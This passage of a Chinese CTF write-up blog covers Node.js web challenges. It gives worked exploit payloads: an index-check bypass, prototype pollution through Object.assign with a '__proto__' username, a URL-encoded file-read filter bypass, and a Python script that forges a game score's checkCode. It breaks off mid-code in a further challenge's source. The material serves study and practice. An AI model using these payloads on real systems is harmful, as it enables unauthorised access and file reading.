class="hljs-literal">true</span> &#125;);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;注册成功&quot;</span>, subscription &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;用户名或邀请码无效&quot;</span> &#125;);<br>&#125;);<br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/article&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> token = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>;<br>    <span class="hljs-keyword">if</span> (token) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> decoded = jwt.<span class="hljs-title function_">verify</span>(token, <span class="hljs-variable constant_">JWT_SECRET</span>);<br>            <span class="hljs-keyword">let</span> index = req.<span class="hljs-property">body</span>.<span class="hljs-property">index</span>;<br>            <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">index</span> &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;你知道我要说什么&quot;</span> &#125;);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (decoded.<span class="hljs-property">subscription</span> !== <span class="hljs-string">&quot;premium&quot;</span> &amp;&amp; index &gt;= <span class="hljs-number">7</span>) &#123;<br>                <span class="hljs-keyword">return</span> res<br>                    .<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>)<br>                    .<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;订阅高级会员以解锁&quot;</span> &#125;);<br>            &#125;<br>            index = <span class="hljs-built_in">parseInt</span>(index);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Number</span>.<span class="hljs-built_in">isNaN</span>(index) || index &gt; articles.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;你知道我要说什么&quot;</span> &#125;);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(articles[index]);<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>            res.<span class="hljs-title function_">clearCookie</span>(<span class="hljs-string">&quot;token&quot;</span>);<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;重新登录罢&quot;</span> &#125;);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;未登录&quot;</span> &#125;);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>premium</code>判断逻辑：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">voucher === <span class="hljs-variable constant_">FLAG</span> + <span class="hljs-variable constant_">JWT_SECRET</span><br></code></pre></td></tr></table></figure><p>这个感觉没啥利用点，如果我都知道FLAG了还去弄它干啥。。猜测是某种方式读<code>JWT_SECRET</code>然后进行伪造。</p><p>后面看了<code>wp</code>，这里直接传<code>&#123;&quot;index&quot;:&quot;7+1&quot;&#125;</code>就行。。唉</p><p>这么传可以绕过第一个<code>if</code>的判断：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">index = <span class="hljs-string">&quot;7+1&quot;</span>;<br><span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">7</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;大于或等于7！！&quot;</span>)<br>&#125;<br>index = <span class="hljs-built_in">parseInt</span>(index);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(index)<br><span class="hljs-comment">//结果：7</span><br></code></pre></td></tr></table></figure><p>然后会进第二个<code>if</code>，满足<code>index</code>不大于<code>7</code>，输出<code>flag</code>。</p><p>后面看了官方<code>wp</code>，还有其它解法，这里直接复制粘贴了：</p><p>原本<code>parseInt()</code>接收字符串参数并转为整形数据类型，但如果目标是 Node 中的<code>big int</code>，转换时会造成精度损失，但能绕过正常的大小比较。</p><blockquote><p>在 Node.js 中，<code>BigInt</code> 是一种数据类型，用于表示大整数，即超出 JavaScript 原生 <code>Number</code> 类型范围的整数值。JavaScript 中的普通 <code>Number</code> 类型有一个有限的范围，超出这个范围的整数值无法精确表示，会导致精度丢失或溢出。</p><p><code>BigInt</code> 类型通过在整数值后面添加 <code>n</code> 后缀来表示，例如 <code>1234567890123456789012345678901234567890n</code>。它允许表示的整数范围比 <code>Number</code> 类型更大，因此在需要处理非常大的整数时非常有用。</p></blockquote><p><img src="/img/images.png" alt="images"></p><p><img src="/img/bigbigint.png" alt="bigbigint"></p><p>或者：数字分隔符也可以绕过大小比较。</p><p><img src="/img/fenge1.png" alt="fenge1"></p><p><img src="/img/fenge2.png" alt="fenge2"></p><h2 id="cbshop"><a href="#cbshop" class="headerlink" title="cbshop"></a>cbshop</h2><p>这题写的不太好，移步：<a href="https://www.ctfiot.com/57949.html">参考文章</a></p><p>主要看<code>app.js</code>，放一些比较关键的地方：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> adminUser = &#123;<br>    <span class="hljs-attr">username</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&quot;😀admin😀&quot;</span>,<br>    <span class="hljs-attr">money</span>: <span class="hljs-number">9999</span><br>&#125;;<br><span class="hljs-comment">//定义了adminUser对象，给了用户名密码和money</span><br><span class="hljs-comment">//login路由：</span><br>    <span class="hljs-keyword">if</span>(username === adminUser.<span class="hljs-property">username</span> &amp;&amp; password === adminUser.<span class="hljs-property">password</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>)) &#123;<span class="hljs-comment">//only admin need password</span><br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">money</span> = adminUser.<span class="hljs-property">money</span>;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<br>            <span class="hljs-attr">code</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">username</span>: username,<br>            <span class="hljs-attr">money</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">money</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;admin login success!&#x27;</span><br>        &#125;);<br>    &#125;<br><span class="hljs-comment">//buyApi</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">buyApi</span>(<span class="hljs-params">user, product</span>) &#123;<br>    <span class="hljs-keyword">let</span> order = &#123;&#125;;<br>    <span class="hljs-keyword">if</span>(!order[user.<span class="hljs-property">username</span>]) &#123;<br>        order[user.<span class="hljs-property">username</span>] = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order[user.<span class="hljs-property">username</span>], product);<br><br>    <span class="hljs-keyword">if</span>(product.<span class="hljs-property">id</span> === <span class="hljs-number">1</span>) &#123;             <span class="hljs-comment">//buy fakeFlag</span><br>        <span class="hljs-keyword">if</span>(user.<span class="hljs-property">money</span> &gt;= <span class="hljs-number">10</span>) &#123;<br>            user.<span class="hljs-property">money</span> -= <span class="hljs-number">10</span>;<br>            <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order, &#123; <span class="hljs-attr">msg</span>:  fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/fakeFlag&#x27;</span>).<span class="hljs-title function_">toString</span>() &#125;);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order,&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;you don&#x27;t have enough money!&quot;</span> &#125;);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(product.<span class="hljs-property">id</span> === <span class="hljs-number">2</span>) &#123;        <span class="hljs-comment">//buy flag</span><br>        <span class="hljs-keyword">if</span>(user.<span class="hljs-property">money</span> &gt;= <span class="hljs-number">11</span> &amp;&amp; user.<span class="hljs-property">token</span>) &#123;  <span class="hljs-comment">//do u have token?</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(product).<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;<br>                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order,&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;hint: go to &#x27;readFileSync&#x27;!!!!&quot;</span> &#125;);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                user.<span class="hljs-property">money</span> -= <span class="hljs-number">11</span>;<br>                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order,&#123; <span class="hljs-attr">msg</span>: fs.<span class="hljs-title function_">readFileSync</span>(product.<span class="hljs-property">name</span>).<span class="hljs-title function_">toString</span>() &#125;);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order,&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;nononono!&quot;</span> &#125;);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order,&#123; <span class="hljs-attr">code</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;no such product!&quot;</span> &#125;);<br>    &#125;<br>    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order, &#123; <span class="hljs-attr">username</span>: user.<span class="hljs-property">username</span>, <span class="hljs-attr">code</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">money</span>: user.<span class="hljs-property">money</span> &#125;);<br>    <span class="hljs-keyword">return</span> order;<br>&#125;<br><span class="hljs-comment">//script.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">product</span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/buy&#x27;</span>, &#123;<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-attr">headers</span>: &#123;<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>        &#125;,<br>        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>            <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span> + product.<span class="hljs-property">name</span>, <br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-title class_">Number</span>(product.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&#x27;idNum&#x27;</span>))<br>        &#125;)<br>    &#125;)<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">displayChange</span>(data));<br>&#125;<br></code></pre></td></tr></table></figure><p>商店类型题目，大致逻辑就是得以<code>admin</code>用户的身份登录(给了<code>adminUser</code>对象)，<code>admin</code>的<code>money</code>是<code>9999</code>。先看怎么才能获得<code>admin</code>这个身份：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(username === adminUser.<span class="hljs-property">username</span> &amp;&amp; password === adminUser.<span class="hljs-property">password</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>)) &#123;<span class="hljs-comment">//only admin need password</span><br>       req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>       req.<span class="hljs-property">session</span>.<span class="hljs-property">money</span> = adminUser.<span class="hljs-property">money</span>;<br></code></pre></td></tr></table></figure><p>结合<code>const adminUser</code>，把<code>😀admin😀</code>截取一下，直接在控制台上运行：</p><p><img src="/img/cbshop2.png" alt="cbshop2"></p><p><code>console.log(&quot;😀admin😀&quot;.substring(1,6))</code></p><p>成功登录：</p><p><img src="/img/cbshop3.png" alt="cbshop3"></p><p>然后就是<code>buyApi</code>下<code>buyflag</code>的逻辑：</p><p><img src="/img/cbshop4.png" alt="cbshop4"></p><p>首先得满足<code>if(user.money &gt;= 11 &amp;&amp; user.token)</code>，这里money肯定是足够的。注意这个<code>user.token</code>:</p><p><img src="/img/cbshop5.png" alt="cbshop5"></p><p><code>user</code>变量只定义了<code>username</code>和<code>money</code>属性，直接在请求体里加<code>token:true</code>并不满足要求：</p><p><img src="/img/cbshop6.png" alt="cbshop6"></p><p>那怎么样才能使<code>user.token</code>为<code>True</code>呢？这里想到可以去用原型链污染直接“变”出一个<code>token</code>来。虽然<code>user</code>变脸不存在<code>token</code>属性，但<code>js</code>使用原型继承，对象可以通过原型链继承属性和方法。<code>user</code>如果没有token这个属性它会往上找。</p><p>但如何进行原型链污染？</p><p>原型链污染比较常见的函数有<code>merge</code>,<code>copy</code>，比如<code>merge(aa,bb)</code>这种。但这题没出现这俩函数，不过有这么个东西：</p><p><img src="/img/cbshop8.png" alt="cbshop8"></p><p>令<code>order</code>为空对象，然后进行<code>assign(order[user.username], product)</code>这么个类似merge的操作。</p><p>看下它的定义：</p><p><img src="/img/cbshop7.png" alt="cbshop7"></p><p>然后<code>/buy</code>路由下定义了<code>order=buyApi(user,req.body)</code>。现在的思路就是令<code>user.username</code>为<code>__proto__</code>然后请求体里放个<code>&quot;token&quot;:true</code>就行。<code>assign</code>完了就行<code>Order.__proto__</code>下存在<code>token:true</code>。(<code>user</code> 和 <code>order</code> 的原型都是 <code>Object</code>。)</p><p>这里可以建个用户名为<code>__proto__</code>的然后进<code>/buy</code>路由触发，也能通过<code>/changeUsername</code>的路由改amdin的用户名然后触发：</p><p><img src="/img/cbshop10.png" alt="cbshop10"></p><p>然后就能进下一个<code>if</code>了：</p><p><img src="/img/cbshop11.png" alt="cbshop11"></p><p>看下逻辑：</p><p><img src="/img/cbshop12.png" alt="cbshop12"></p><p>判断请求体里有没有flag字段，不存在才会对<code>product.name</code>进行文件读取。现在的问题是我们需要绕过这个<code>flag</code>关键字的判断。</p><p><a href="https://blog.csdn.net/not_code_god/article/details/126953258">参考文章</a></p><p><code>readFileSync</code>这个原生函数其实是可以传入一个URL对象的，URL对象会自动URL解码，这样就可以通过URL编码绕过waf了。但注意不能仅仅把<code>req.body</code>里<code>name</code>字段的值URL编码，这里要传过去一个URL对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&#x27;file:///fl%61g&#x27;</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/cbshop13.png" alt="cbshop13"></p><p>把这个东西整体给name字段就行，不过不知道为啥我看其他人写的wp交这个可以我的就不行。。</p><p>只有删掉一些字段后才正常：</p><p><img src="/img/cbshop14.png" alt="cbshop14"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;href&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;origin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;b&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;pathname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/fl%61g&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;file:&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;hostname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="dino3d"><a href="#dino3d" class="headerlink" title="dino3d"></a>dino3d</h2><p>前端小游戏，够1000000分给flag。</p><p><img src="/img/dino3d1.png" alt="dino3d1"></p><p>他这个游戏结束会发个数据包出去，但没法直接改，存在<code>checkcode</code>验证(注意这个<code>check.php</code>没法直接访问)：</p><p><img src="/img/dino3d2.png" alt="dino3d2"></p><p>然后<code>view-source</code>直接在那一堆<code>js</code>文件里嗯搜带<code>check.php</code>的内容：</p><p><img src="/img/d3node.png" alt="d3node"></p><p>整理下这段js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JS"><span class="hljs-comment">// 定义一个函数，参数为 e（分数）和 t（检查码）</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sn</span>(<span class="hljs-params">e, t</span>) &#123;<br>    <span class="hljs-comment">// 确保 e 和 t 均不为假值</span><br>    <span class="hljs-keyword">if</span> (e &amp;&amp; t) &#123;<br>        <span class="hljs-comment">// 使用 fetch 方法发送 POST 请求</span><br>        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/check.php&quot;</span>, &#123;<br>            <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>            <span class="hljs-attr">headers</span>: &#123;<br>                <span class="hljs-string">&quot;Content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span><br>            &#125;,<br>            <span class="hljs-comment">// 请求体包含分数（score）、检查码（checkCode）、时间戳（tm）</span><br>            <span class="hljs-attr">body</span>: <span class="hljs-string">&quot;score=&quot;</span> + <span class="hljs-built_in">parseInt</span>(e).<span class="hljs-title function_">toString</span>() + <span class="hljs-comment">// 将分数转换为整数并转换为字符串</span><br>                  <span class="hljs-string">&quot;&amp;checkCode=&quot;</span> + <span class="hljs-title function_">md5</span>(<span class="hljs-built_in">parseInt</span>(e).<span class="hljs-title function_">toString</span>() + t) + <span class="hljs-comment">// 使用 MD5 加密生成检查码</span><br>                  <span class="hljs-string">&quot;&amp;tm=&quot;</span> + (+<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>).<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) <span class="hljs-comment">// 获取当前时间戳并截取前10位</span><br>        &#125;)<br>        <span class="hljs-comment">// 处理 fetch 返回的 Promise，解析成文本格式</span><br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e.<span class="hljs-title function_">text</span>())<br>        <span class="hljs-comment">// 处理返回的文本结果，弹出警告框显示结果</span><br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-title function_">alert</span>(e));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>定义了函数<code>sn</code>，这个<code>e</code>可以猜到应该是分数，但<code>t</code>是什么不知道，继续搜是否有其它地方调用了这个<code>sn</code>函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">return</span> game.<span class="hljs-title function_">sn</span>(score.<span class="hljs-property">score</span>,checkCode)<br><span class="hljs-comment">//同上搜checkCode:</span><br><span class="hljs-keyword">var</span> checkCode=<span class="hljs-string">&quot;DASxCBCTF&quot;</span>+salt<br><span class="hljs-comment">//同上搜salt</span><br><span class="hljs-keyword">var</span> salt=<span class="hljs-string">&quot;_wElc03e&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://node5.buuoj.cn:26373/check.php&quot;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span><br>&#125;<br><br>body = &#123;<br>    <span class="hljs-string">&quot;score&quot;</span>: <span class="hljs-string">&quot;10000000&quot;</span>,<br>    <span class="hljs-string">&quot;checkCode&quot;</span>: md5(<span class="hljs-string">&quot;10000000DASxCBCTF_wElc03e&quot;</span>.encode()).hexdigest(),<br>    <span class="hljs-string">&quot;tm&quot;</span>: <span class="hljs-built_in">str</span>((time.time()))[:<span class="hljs-number">10</span>]<br>&#125;<br><br>res = requests.post(url, headers=headers, data=body)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>或者直接在控制台打：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> s = <span class="hljs-string">&quot;DASxCBCTF_wElc03e&quot;</span>;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(game.sn(<span class="hljs-number">10000000</span>, s));<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/not_code_god/article/details/126953258">参考文章</a></p><p>不过这两种方法我都没成功。。明明照着wp写的😵</p><h2 id="CTFSHOW766"><a href="#CTFSHOW766" class="headerlink" title="CTFSHOW766"></a>CTFSHOW766</h2><p><code>/source</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// node 8.12.0</span><br><span class="hljs-keyword">const</span> createError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http-errors&#x27;</span>);<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> logger = <span class="hljs-built_in">require</span>(<span 